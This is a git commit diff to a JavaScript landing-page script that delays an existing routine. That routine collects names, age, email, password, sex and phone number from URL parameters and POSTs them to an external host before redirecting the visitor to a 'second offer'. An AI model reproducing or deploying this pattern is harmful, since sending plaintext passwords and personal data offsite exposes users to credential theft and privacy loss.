1b63636b1ae5dcbd95af16cb1a8d5f7508cb1e67
Pavlo Svystun <nefely123@gmail.com>
2024-01-03 16:23:42 +0200

    timeout

--- admt_scripts.js
+++ admt_scripts.js
@@ -1409,37 +1409,39 @@ admt_start = () => {
 				params_object.frq = Number(params_object.frq) + 1 
 				params_object.flw = params_object.flw + "_2nd"
 
-				let api_send_data = {
-					name: params_object?.n ,
-					last_name: params_object?.fn ,
-					age: params_object?.a ,
-					email: params_object?.em ,
-					password: params_object?.ps ,
-					sex: params_object?.sx ,
-					phone: params_object?.ph ,
-				}
-				for (let key in api_send_data) {
-				    if (api_send_data[key] === "" || api_send_data[key] === undefined || api_send_data[key] == 'unkwn' || api_send_data[key] == null) {
-				        delete api_send_data[key];
-				    }
-				}
-				if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
-					$.ajax({
-					    url: 'https://img.cumfast.live/email.php',
-					    type: 'POST',
-					    data: api_send_data,
-					    success: function(response) {
-					        console.log('Запит відправлено успішно!', response);
-					    },
-					    error: function(xhr, status, error) {
-					        console.error('Помилка при відправленні запиту:', status, error);
+				setTimeout(()=>{
+					let api_send_data = {
+						name: params_object?.n ,
+						last_name: params_object?.fn ,
+						age: params_object?.a ,
+						email: params_object?.em ,
+						password: params_object?.ps ,
+						sex: params_object?.sx ,
+						phone: params_object?.ph ,
+					}
+					for (let key in api_send_data) {
+					    if (api_send_data[key] === "" || api_send_data[key] === undefined || api_send_data[key] == 'unkwn' || api_send_data[key] == null) {
+					        delete api_send_data[key];
 					    }
-					});
-				}
-
+					}
+					if (params_object.em !== "" && /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(params_object.em)) {
+						$.ajax({
+						    url: 'https://img.cumfast.live/email.php',
+						    type: 'POST',
+						    data: api_send_data,
+						    success: function(response) {
+						        console.log('Запит відправлено успішно!', response);
+						    },
+						    error: function(xhr, status, error) {
+						        console.error('Помилка при відправленні запиту:', status, error);
+						    }
+						});
+					}
+				},50)
+				
 				setTimeout(function() {
 				    document.location.href = $(".second-offer-go").attr("href")
-				}, 500);
+				}, 550);
 			});
 		});
 	}
